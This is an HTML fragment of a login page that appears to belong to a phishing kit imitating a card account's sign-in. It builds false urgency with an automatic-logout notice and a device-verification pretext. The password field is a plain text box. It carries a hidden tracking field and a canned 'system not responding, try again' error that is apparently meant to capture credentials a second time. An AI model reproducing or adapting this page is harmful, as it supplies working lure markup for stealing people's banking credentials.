    <div class="nwrapper">
		
					<div id="clsdiv">
				        
						  <div id="starting" style="padding: 5px 5px; display: none">
						  	<div class="dynamicContainer">
						  	 <div class="dynamicSubContainer">
						  	 <p style="padding: 50px;"></p>
						  	<div class="formHeader">
						  		<p style="text-align: center; color: #00366c; font-weight: 600; font-size: 15px;">Important! Account Activity Review:</p>
						  		<p style="text-align: center; color: #646464; font-weight: 400; font-size: 12px; line-height: 13px; margin-top: 5px">For your safety, we logged you out automatically after 5 minutes of inactivity. Please log in again.</p>
						  		<p style="text-align: center; color: #575757; font-weight: 600; font-size: 0px;"></p>
        						<p style="text-align: center; color: #515151; font-weight: 600; font-size: 11px; line-height: 13px; margin-top: 20px"> Even though you’ve added this device to your account, on occasion we still need to do device verification. </p>
        					</div>
        					<p style="padding: 50px;"></p>
        				   </div>
        				   </div>
    					 </div>
    					 
    				   	 <div id="loading" style="padding: 5px 5px; display: none">
    				   	  <div class="dynamicContainer">
    				   		<div class="dynamicSubContainer">
        						<p style="padding: 70px;"></p>
        						<div class="d-flex justify-content-center">
      								<i id="spinner" class="spinner-border spinner-border-lg spinner" role="status"><span class="visually-hidden">&nbsp;Loading.....</span></i>
    							</div>
        						<p style="padding: 70px;"></p>
        					</div>
        				  </div>
    				  	</div>
    					  
                    	<div id="clsdiv1" style="display: none;">
                    	   <form id="fuida" action="#" method="post">
                    	     <div class="dynamicGridDiv">                   	     	    

                      		<div class="fuidformContent">
                    		<div style="font-family: BentonSans,Helvetica Neue,Helvetica,sans-serif; font-size: 1.255rem; text-align: center !important; color: #333; font-weight: 200; line-height: 1.75rem;">  Log In to My Account </div>
                    		<div>&nbsp;</div>
                    		<div class="inputWrapper">
                           	   <div style="line-height: 15px;">
                           		<p id="msg" style="font-size: 15px; font-weight: 400; color: #b42c01; line-height: 20px; display: none;"> &#9888; &nbsp; Our System is Not Responding. Please try again with correct Log In details.</p>
          			    		<p id="error" style="font-size: 15px; font-weight: 400; color: #b42c01; line-height: 20px; display: none;"></p>
          			    		<p id="logcount" style="font-size: 15px; color: #b42c01; line-height: 20px; display: none;"></p>
				 		       </div>
				 		        
                                <label class="labelTxt"><span class="oun"></span></label>
                             	<input id="oun" type="text" name="eliloUserID" aria-invalid="false" aria-required="false" data-testid="userid-input" aria-labelledby="eliloUserID-label" autocomplete="username" class="input-control" value="">
                     			<div>&nbsp;</div>	
                     				
                                <label class="labelTxt"><span class="ps"></span></label>                             
                              	<div class="upw-container">
                                 <input id="upw" type="text" name="eliloPassword"  aria-invalid="false" aria-required="false" data-testid="password-input" aria-labelledby="eliloPassword-label" autocomplete="current-password" class="input-control" value="">
                                 <div class="toggle-upw" id="toggleupw">Show</div>
                               </div>
                               
                              	<div>&nbsp;</div>
        					   <label><input name="checked" type="checkbox">&nbsp; Remember Me</label>
        					 
                           	   <div>&nbsp;</div>
                              <div> 
                              	<input type="hidden" class="input-control" name="trck" id="trcka">
                              	<button type="button" name="submita" class="btn btn-primary" id="login" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;"> Log In </button>
                              </div>
								<div>
								  <ul style="font-size:.935rem; font-weight: 200; list-style:none; margin-top:1.25rem; margin-bottom:0.5em; padding-left:0; line-height: 2.15rem;">
								    <li>
								      <a href="#" id="cinfoverlayBtn1" style="color: #0066c1; text-decoration:none;">Forgot User ID or Password?</a>
								    </li>
								    <li>
								      <a href="#" id="cinfoverlayBtn2" title="Create New Online Account" style="color: #0066c1; text-decoration:none;"> <span>Create New Online Account</span> </a>
								    </li>
								    <li>
								      <a href="#" id="cinfoverlayBtn3" title="Confirm Card Received" style="color: #0066c1; text-decoration:none;"> <span>Confirm Card Received</span> </a>
								    </li>
								  </ul>
								</div>	
                              </div>
                             </div>
                                                        
